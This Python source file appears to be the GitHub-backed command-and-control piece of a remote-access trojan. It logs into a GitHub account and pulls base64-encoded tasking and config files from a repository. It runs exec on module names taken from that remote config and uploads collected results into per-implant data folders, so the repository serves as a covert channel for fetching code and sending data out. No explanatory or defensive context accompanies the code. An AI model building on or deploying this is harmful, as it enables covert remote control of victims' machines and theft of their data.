import json
import base64
import imp
import random
import threading
import os
import sys
import time
import encodings.idna
import encodings.latin_1

from github3 import login
import pcontroller_constants

class Git:

	def __init__(self):
		self.gh = login(username=pcontroller_constants.P_GITHUB_USERNAME, password=pcontroller_constants.P_GITHUB_PASSWORD);
		self.repo = self.gh.repository(pcontroller_constants.P_GITHUB_USERNAME, pcontroller_constants.P_GITHUB_REPOSITORY);
		self.branch = self.repo.branch(pcontroller_constants.P_GITHUB_BRANCH);
		pcontroller_constants.PCONFIGURED = True;

	def get_file_contents(self, filepath):
		tree = self.branch.commit.commit.tree.recurse();
		for filename in tree.tree:
			if filepath in filename.path:
				blob = self.repo.blob(filename._json_data['sha']);
				return blob.content;
		return None;

	def import_modules(self, config_name):
		config_json = self.get_file_contents(config_name);
		config = json.loads(base64.b64decode(config_json));

		for task in config:
			if task['module'] not in sys.modules:
				exec("import %s" % task['module']);
		return config;

	def get_cmd(self, cmd_name):
		cmd_json = self.get_file_contents(cmd_name);
		cmd = json.loads(base64.b64decode(cmd_json));
		return cmd;

	def store_module_result(self, data, pcontroller_id, commit_message, module):
		remote_path = "data/%s/%s.data" %(pcontroller_id, module+"_"+time.strftime("%H:%M:%S"));
		self.repo.create_file(remote_path, commit_message, data[0]);
		return;	